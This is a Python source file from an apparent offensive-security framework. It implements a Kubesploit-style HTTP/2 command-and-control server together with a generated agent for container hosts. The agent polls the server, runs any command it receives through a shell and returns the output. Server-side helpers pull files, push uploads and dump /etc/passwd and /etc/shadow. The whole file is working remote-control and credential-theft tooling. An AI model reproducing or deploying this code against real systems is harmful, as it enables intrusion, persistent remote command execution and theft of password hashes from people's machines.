"""Kubesploit-style HTTP/2 Command & Control server + containerized agent.

The server speaks HTTP/2 over raw sockets (h2c cleartext or HTTP/2 over TLS with
ALPN "h2"), modeled after Kubesploit/Merlin. Agents are single-file Python scripts
that poll the C2 via HTTP/2 JSON endpoints; each registered agent becomes a
Session so the rest of the framework (CLI `sessions`, web UI, post-exploitation
helpers) works unchanged.
"""

from __future__ import annotations
import json
import os
import socket
import ssl
import subprocess
import threading
import time
import uuid
from typing import Optional

from webforg.core.session import Session
from webforg.core.target import Target

try:
    from h2.config import H2Configuration
    from h2.connection import H2Connection
    from h2.events import (
        RequestReceived,
        DataReceived,
        StreamEnded,
        StreamReset,
        ConnectionTerminated,
    )
    H2_AVAILABLE = True
except ImportError:  # pragma: no cover
    H2_AVAILABLE = False

CERT_DIR = os.path.expanduser("~/.webforg")
CERT_FILE = os.path.join(CERT_DIR, "cert.pem")
KEY_FILE = os.path.join(CERT_DIR, "key.pem")

_REASON = {200: "OK", 400: "Bad Request", 404: "Not Found"}


# ── Agent state ────────────────────────────────────────────────────────────

class C2Agent:
    """State for one registered agent (queue of pending jobs, delivered results)."""

    def __init__(self, agent_id: str):
        self.id = agent_id
        self.info: dict = {}
        self.jobs: list[dict] = []      # {job_id, cmd}
        self.results: dict[str, str] = {}  # job_id -> output
        self.cond = threading.Condition()
        self.last_active = time.time()
        self.session: Optional["C2AgentSession"] = None


class C2AgentSession(Session):
    """A Session that routes commands/results through the HTTP/2 check-in queue."""

    def __init__(self, agent: C2Agent, server: "Http2C2Server", target: Target, module_name: str):
        super().__init__(target=target, module_name=module_name, payload_name="c2/http2")
        self.agent = agent
        self.server = server
        self.session_type = "c2"

    def send(self, command: str, timeout: float = 30.0) -> str:
        self.last_active = time.time()
        if not self.alive:
            return "[!] Session is dead"
        if self.server is None or not self.server.running:
            return "[!] C2 server is not running"
        agent = self.server.agents.get(self.agent.id)
        if agent is None:
            return "[!] Agent not registered"
        job_id = uuid.uuid4().hex[:12]
        with agent.cond:
            agent.jobs.append({"job_id": job_id, "cmd": command})
            agent.cond.wait_for(lambda: agent.results.get(job_id) is not None, timeout)
            output = agent.results.pop(job_id, None)
        if output is None:
            return "[!] Agent did not respond in time (next check-in will deliver the result)"
        return output

    def send_meterpreter(self, command: str) -> str:
        return self.send(command)

    def probe_shell(self) -> str:
        out = self.send("id 2>/dev/null; uname -a 2>/dev/null") or ""
        self.platform = "linux" if "linux" in out.lower() else "unknown"
        return "c2_agent"

    def _framed(self, command: str, timeout: float = 35.0) -> str:
        tag = "WF" + uuid.uuid4().hex[:8]
        out = self.send(f"{command}; echo {tag}END", timeout=timeout) or ""
        marker = f"{tag}END"
        if marker in out:
            out = out[: out.index(marker)]
        return out.strip()

    def download(self, remote_path: str, timeout: float = 35.0) -> dict:
        import base64
        import shlex
        name = remote_path.rsplit("/", 1)[-1] or "download"
        out = self._framed(f"cat {shlex.quote(remote_path)} 2>/dev/null | base64 -w0", timeout=timeout)
        if not out:
            return {"ok": False, "name": name, "size": 0, "data_b64": "", "error": "No output (file may not exist)"}
        try:
            data = base64.b64decode(out)
        except Exception:
            return {"ok": False, "name": name, "size": 0, "data_b64": "", "error": "Could not decode output"}
        return {"ok": True, "name": name, "size": len(data), "data_b64": base64.b64encode(data).decode()}

    def upload(self, data: bytes, remote_path: str, timeout: float = 35.0) -> dict:
        import base64
        import shlex
        b64 = base64.b64encode(data).decode()
        dst = shlex.quote(remote_path)
        if not b64:
            return {"ok": False, "error": "Empty data"}
        chunks = [b64[i : i + 3000] for i in range(0, len(b64), 3000)]
        for i, c in enumerate(chunks):
            mode = ">" if i == 0 else ">>"
            self._framed(f"printf '{c}' | base64 -d {mode} {dst}", timeout=timeout)
        ok = "WF_OK" in self._framed(f"test -s {dst} && echo WF_OK || echo WF_MISSING", timeout=timeout)
        return {"ok": ok, "path": remote_path, "size": len(data)}

    def hashdump(self) -> dict:
        passwd = self._framed("cat /etc/passwd 2>/dev/null")
        shadow = self._framed("cat /etc/shadow 2>/dev/null")
        return {"ok": bool(passwd), "passwd": passwd, "shadow": shadow}

    def sysinfo(self) -> dict:
        return {
            "ok": True,
            "uname": self._framed("uname -a 2>/dev/null"),
            "os": self._framed("cat /etc/os-release 2>/dev/null | head -3"),
            "id": self._framed("id 2>/dev/null"),
            "pwd": self._framed("pwd 2>/dev/null"),
            "user": self._framed("whoami 2>/dev/null"),
        }

    def close(self) -> None:
        self.alive = False
        try:
            agent = self.server.agents.get(self.agent.id)
            if agent:
                with agent.cond:
                    agent.results.clear()
                    agent.cond.notify_all()
        except Exception:
            pass


# ── HTTP/2 C2 server ───────────────────────────────────────────────────────

def _ensure_cert() -> tuple[Optional[str], Optional[str]]:
    """Generate a self-signed TLS cert if needed. Returns (certfile, keyfile)."""
    if os.path.exists(CERT_FILE) and os.path.exists(KEY_FILE):
        return CERT_FILE, KEY_FILE
    try:
        from cryptography import x509
        from cryptography.hazmat.primitives import hashes, serialization
        from cryptography.hazmat.primitives.asymmetric import rsa
        from cryptography.x509.oid import NameOID
        import datetime

        os.makedirs(CERT_DIR, exist_ok=True)
        key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "webforg-c2")])
        cert = (
            x509.CertificateBuilder()
            .subject_name(name)
            .issuer_name(name)
            .public_key(key.public_key())
            .serial_number(x509.random_serial_number())
            .not_valid_before(datetime.datetime.utcnow() - datetime.timedelta(days=1))
            .not_valid_after(datetime.datetime.utcnow() + datetime.timedelta(days=365))
            .add_extension(x509.SubjectAlternativeName([x509.DNSName("localhost")]), False)
            .sign(key, hashes.SHA256())
        )
        with open(KEY_FILE, "wb") as fh:
            fh.write(key.private_bytes(serialization.Encoding.PEM, serialization.PrivateFormat.TraditionalOpenSSL, serialization.NoEncryption()))
        with open(CERT_FILE, "wb") as fh:
            fh.write(cert.public_bytes(serialization.Encoding.PEM))
        return CERT_FILE, KEY_FILE
    except Exception:
        return None, None


class Http2C2Server:
    """HTTP/2 C2 server (Kubesploit-style) built directly on hyper-h2 frames."""

    def __init__(
        self,
        lhost: str = "0.0.0.0",
        lport: int = 8444,
        tls: bool = False,
        name: str = "c2",
    ):
        self.lhost = lhost
        self.lport = lport
        self.tls = tls
        self.name = name
        self.agents: dict[str, C2Agent] = {}
        self._peer_agents: dict[tuple, str] = {}
        self._sock: Optional[socket.socket] = None
        self._thread: Optional[threading.Thread] = None
        self._running = False
        self._lock = threading.Lock()
        self.on_session: Optional[callable] = None

    @property
    def running(self) -> bool:
        return self._running

    def start(self, on_session: Optional[callable] = None) -> str:
        if not H2_AVAILABLE:
            return "[-] h2 library not available — run: pip install h2"
        with self._lock:
            if self._running:
                return f"[!] C2 listener already running on {self.lhost}:{self.lport}"
            try:
                self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self._sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                self._sock.bind((self.lhost, self.lport))
                self._sock.listen(16)
                self._sock.settimeout(1.0)
                self._running = True
                self.on_session = on_session
                self._thread = threading.Thread(target=self._accept_loop, daemon=True)
                self._thread.start()
                mode = "HTTP/2 + TLS" if self.tls else "HTTP/2 cleartext"
                return f"[+] Kubesploit-style C2 listener started on {self.lhost}:{self.lport} ({mode})"
            except Exception as e:
                self._running = False
                return f"[-] Failed to start C2 listener: {e}"

    def stop(self) -> str:
        with self._lock:
            self._running = False
        if self._sock:
            try:
                self._sock.close()
            except Exception:
                pass
            self._sock = None
        return f"[+] C2 listener {self.name} stopped"

    def _accept_loop(self) -> None:
        while self._running:
            try:
                client, _addr = self._sock.accept()
            except socket.timeout:
                continue
            except OSError:
                break
            except Exception:
                continue
            threading.Thread(target=self._serve_conn, args=(client,), daemon=True).start()

    def _tls_context(self) -> Optional[ssl.SSLContext]:
        cert, key = _ensure_cert()
        if not cert or not key:
            return None
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        try:
            ctx.load_cert_chain(cert, key)
            ctx.set_alpn_protocols(["h2"])
            return ctx
        except Exception:
            return None

    def _serve_conn(self, raw: socket.socket) -> None:
        peer = raw.getpeername()[0]
        sock = raw
        try:
            if self.tls:
                ctx = self._tls_context()
                if ctx is None:
                    return
                sock = ctx.wrap_socket(raw, server_side=True)
            conn = H2Connection(config=H2Configuration(client_side=False))
            conn.initiate_connection()
            self._flush(sock, conn)
            sock.settimeout(1.0)
            buffers: dict[int, bytes] = {}
            requests: dict[int, tuple] = {}
            while self._running:
                try:
                    data = sock.recv(65535)
                except socket.timeout:
                    self._flush(sock, conn)
                    continue
                except Exception:
                    break
                if not data:
                    break
                events = conn.receive_data(data)
                for event in events:
                    if isinstance(event, RequestReceived):
                        headers = dict(event.headers)
                        requests[event.stream_id] = (
                            headers.get(":method") or headers.get(b":method"),
                            headers.get(":path") or headers.get(b":path"),
                        )
                        buffers[event.stream_id] = b""
                    elif isinstance(event, DataReceived):
                        buffers[event.stream_id] = buffers.get(event.stream_id, b"") + event.data
                        conn.acknowledge_received_data(event.flow_controlled_length, event.stream_id)
                    elif isinstance(event, StreamEnded):
                        method, path = requests.get(event.stream_id, (None, None))
                        body = buffers.get(event.stream_id, b"")
                        self._dispatch(sock, conn, event.stream_id, method, path, body, peer)
                    elif isinstance(event, (StreamReset, ConnectionTerminated)):
                        sock.close()
                        return
                self._flush(sock, conn)
        except (ssl.SSLError, ConnectionError, OSError):
            pass
        except Exception:
            pass
        finally:
            try:
                sock.close()
            except Exception:
                pass

    def _dispatch(self, sock, conn, stream_id, method, path, body, peer) -> None:
        if method == b"POST" or method == "POST":
            path_s = (path or b"").decode() if isinstance(path, bytes) else (path or "")
            if path_s == "/c2/register":
                self._respond(sock, conn, stream_id, 200, json.dumps(self._register(self._json(body), peer)).encode())
                return
            if path_s == "/c2/checkin":
                self._respond(sock, conn, stream_id, 200, json.dumps(self._checkin(self._json(body))).encode())
                return
        elif method == b"GET" or method == "GET":
            path_s = (path or b"").decode() if isinstance(path, bytes) else (path or "")
            if path_s == "/agent":
                self._respond(sock, conn, stream_id, 200, self.agent_source.encode(), content_type="text/plain")
                return
            if path_s in ("/c2/health", "/health"):
                self._respond(sock, conn, stream_id, 200, json.dumps({"ok": True, "status": "up", "agents": len(self.agents)}).encode())
                return
        self._respond(sock, conn, stream_id, 404, json.dumps({"ok": False, "error": "not found"}).encode())

    @staticmethod
    def _json(body: bytes) -> dict:
        try:
            return json.loads((body or b"").decode("utf-8", errors="replace") or "{}")
        except Exception:
            return {}

    def _respond(self, sock, conn, stream_id, status, body, content_type="application/json") -> None:
        conn.send_headers(
            stream_id,
            [
                (":status", str(status)),
                ("content-type", content_type),
                ("content-length", str(len(body))),
                ("server", "webforg-c2/1.0"),
            ],
        )
        conn.send_data(stream_id, body, end_stream=True)
        self._flush(sock, conn)

    @staticmethod
    def _flush(sock, conn) -> None:
        to_send = conn.data_to_send()
        if to_send:
            try:
                sock.sendall(to_send)
            except Exception:
                pass

    def _register(self, data: dict, peer: str) -> dict:
        agent_id = (data.get("id") or "").strip() or uuid.uuid4().hex[:12]
        agent = self.agents.get(agent_id)
        if agent is None:
            # Reuse an agent from the same peer + hostname so that a restarted
            # agent that lost its persisted id (ephemeral/read-only /tmp,
            # one-liner deploys, container restarts) does NOT register a brand
            # new session on every launch — that would flood the session list.
            hostname = (data.get("hostname") or "").strip()
            peer_key: tuple = (peer, hostname) if hostname else (peer,)
            reuse_id = self._peer_agents.get(peer_key)
            reuse = self.agents.get(reuse_id or "")
            if reuse is not None:
                agent = reuse
                agent.id = agent_id
                self.agents[agent_id] = agent
            else:
                agent = C2Agent(agent_id)
                self.agents[agent_id] = agent
                target = Target(host=peer, port=self.lport)
                session = C2AgentSession(agent, self, target, self.name)
                agent.session = session
                if self.on_session:
                    try:
                        self.on_session(session)
                    except Exception:
                        pass
            if agent.id in self.agents:
                self._peer_agents[peer_key] = agent.id
        agent.info = data
        agent.last_active = time.time()
        return {
            "ok": True,
            "session_id": agent.session.id,
            "agent_id": agent_id,
            "container": data.get("container"),
        }

    def _checkin(self, data: dict) -> dict:
        agent_id = data.get("id") or ""
        agent = self.agents.get(agent_id)
        if agent is None:
            return {"ok": False, "error": "unknown agent"}
        job_id = data.get("job_id")
        output = data.get("output", "") or ""
        if job_id:
            with agent.cond:
                agent.results[job_id] = output
                agent.cond.notify_all()
        agent.last_active = time.time()
        if agent.session:
            agent.session.last_active = time.time()
        next_job = agent.jobs.pop(0) if agent.jobs else None
        return {
            "ok": True,
            "cmd": next_job["cmd"] if next_job else None,
            "job_id": next_job["job_id"] if next_job else None,
        }

    @property
    def agent_source(self) -> str:
        host = self.lhost if self.lhost not in ("0.0.0.0", "") else "127.0.0.1"
        return generate_agent(host, self.lport, self.tls)


class Http2C2Listener:
    """Listener-compatible wrapper so the C2 plugs into CLI + web API listeners."""

    def __init__(
        self,
        lhost: str = "0.0.0.0",
        lport: int = 8444,
        name: str = "",
        tls: bool = False,
        agent_host: Optional[str] = None,
    ):
        self.lhost = lhost
        self.lport = lport
        self.payload_type = "c2/http2"
        self.tls = tls
        self.name = name or f"c2-{lport}"
        self.agent_host = agent_host or (lhost if lhost not in ("0.0.0.0", "") else "127.0.0.1")
        self._server = Http2C2Server(lhost=lhost, lport=lport, tls=tls, name=self.name)

    @property
    def running(self) -> bool:
        return self._server.running

    def start(self, on_session: Optional[callable] = None) -> str:
        return self._server.start(on_session=on_session)

    def stop(self) -> str:
        return self._server.stop()

    @property
    def agent_source(self) -> str:
        return generate_agent(self.agent_host, self.lport, self.tls)


def create_listener(
    lhost: str = "0.0.0.0",
    lport: int = 4444,
    payload_type: str = "shell",
    name: str = "",
    **kwargs,
):
    """Factory used by ListenerManager; routes C2 payloads to the HTTP/2 listener."""
    from webforg.core.session import Listener
    if payload_type.lower() in ("c2", "http2", "kubesploit"):
        return Http2C2Listener(
            lhost=lhost,
            lport=lport,
            name=name,
            tls=bool(kwargs.get("tls", False)),
            agent_host=kwargs.get("agent_host"),
        )
    return Listener(lhost, lport, payload_type, name)


# ── Agent payload ──────────────────────────────────────────────────────────

_AGENT_TEMPLATE = r'''#!/usr/bin/env python3
"""Kubesploit-style HTTP/2 C2 agent for containerized environments."""
import json
import os
import socket
import ssl
import subprocess
import sys
import time
import uuid

HOST = "{host}"
PORT = {port}
TLS = {tls}
SLEEP = float(os.environ.get("KSPL_SLEEP", "3"))
ID_FILE = os.environ.get("KSPL_AGENT_ID", "/tmp/kubesploit-agent.id")

try:
    from h2.config import H2Configuration
    from h2.connection import H2Connection
    from h2.events import DataReceived, StreamEnded
except Exception as e:
    sys.stderr.write(f"[c2] h2 required on agent: {{e}}\n")
    sys.exit(1)


def load_or_create_id():
    try:
        if os.path.exists(ID_FILE):
            with open(ID_FILE) as f:
                aid = f.read().strip()
                if aid:
                    return aid
    except Exception:
        pass
    aid = uuid.uuid4().hex[:12]
    try:
        with open(ID_FILE, "w") as f:
            f.write(aid)
    except Exception:
        # /tmp may be read-only or ephemeral — derive a stable identity from the
        # host so a relaunched agent keeps the same id (no duplicate sessions).
        import hashlib
        key = socket.gethostname()
        for p in ("/etc/machine-id", "/etc/hostname"):
            try:
                with open(p) as f:
                    key += f.read().strip()
            except Exception:
                pass
        return hashlib.sha256(key.encode("utf-8", "replace")).hexdigest()[:12]
    return aid


def detect_container():
    hints = []
    if os.path.exists("/.dockerenv"):
        hints.append("docker")
    try:
        with open("/proc/1/cgroup") as f:
            c = f.read()
        if "kubepods" in c:
            hints.append("kubernetes")
        elif "docker" in c and "docker" not in hints:
            hints.append("docker")
    except Exception:
        pass
    if os.path.isdir("/run/secrets/kubernetes.io"):
        hints.append("kubernetes")
    return hints[0] if hints else None


def sysinfo(aid):
    import getpass
    uname = os.uname()
    return {{
        "id": aid,
        "hostname": socket.gethostname(),
        "user": getpass.getuser(),
        "platform": uname.sysname.lower(),
        "arch": uname.machine,
        "cwd": os.getcwd(),
        "container": detect_container(),
    }}


def connect():
    s = socket.create_connection((HOST, PORT), timeout=10)
    if TLS:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        ctx.set_alpn_protocols(["h2"])
        s = ctx.wrap_socket(s, server_hostname=HOST)
    s.settimeout(20)
    conn = H2Connection(config=H2Configuration(client_side=True))
    conn.initiate_connection()
    s.sendall(conn.data_to_send())
    return s, conn


def request(s, conn, method, path, body=None):
    stream = conn.get_next_available_stream_id()
    headers = [
        (":method", method),
        (":path", path),
        (":scheme", "https" if TLS else "http"),
        (":authority", "{{0}}:{{1}}".format(HOST, PORT)),
        ("content-type", "application/json"),
        ("user-agent", "kubesploit-agent/1.0"),
    ]
    if body is not None:
        headers.append(("content-length", str(len(body))))
    conn.send_headers(stream, headers, end_stream=body is None)
    if body is not None:
        conn.send_data(stream, body, end_stream=True)
    s.sendall(conn.data_to_send())
    resp = b""
    while True:
        try:
            events = conn.receive_data(s.recv(65535))
        except Exception:
            return None
        if not events:
            return None
        for ev in events:
            if isinstance(ev, DataReceived) and ev.stream_id == stream:
                resp += ev.data
            elif isinstance(ev, StreamEnded) and ev.stream_id == stream:
                return resp


def post(s, conn, path, obj):
    out = request(s, conn, "POST", path, json.dumps(obj).encode())
    if out is None:
        return None
    try:
        return json.loads(out.decode("utf-8", errors="replace"))
    except Exception:
        return None


AID = load_or_create_id()
last = {{"job_id": None, "output": ""}}

while True:
    try:
        s, conn = connect()
        try:
            r = post(s, conn, "/c2/register", sysinfo(AID))
            if r is None:
                continue
            while True:
                resp = post(s, conn, "/c2/checkin", {{
                    "id": AID,
                    "job_id": last["job_id"],
                    "output": last["output"],
                }})
                last = {{"job_id": None, "output": ""}}
                if resp is None:
                    break
                cmd = resp.get("cmd")
                if cmd:
                    try:
                        p = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=120)
                        output = (p.stdout or "") + (p.stderr or "")
                    except subprocess.TimeoutExpired:
                        output = "[!] command timed out"
                    except Exception as e:
                        output = "[!] exec error: {{0}}".format(e)
                    last = {{"job_id": resp.get("job_id"), "output": output[-1000000:]}}
        finally:
            try:
                s.close()
            except Exception:
                pass
    except Exception:
        pass
    time.sleep(SLEEP)
'''


def generate_agent(host: str, port: int, tls: bool = False) -> str:
    """Return the single-file Python agent payload for the given C2 address."""
    return _AGENT_TEMPLATE.format(host=host, port=port, tls="True" if tls else "False")


def compile_agent(host: str, port: int, tls: bool = False) -> None:
    """Sanity-check that the generated agent is valid Python."""
    compile(generate_agent(host, port, tls), "agent.py", "exec")
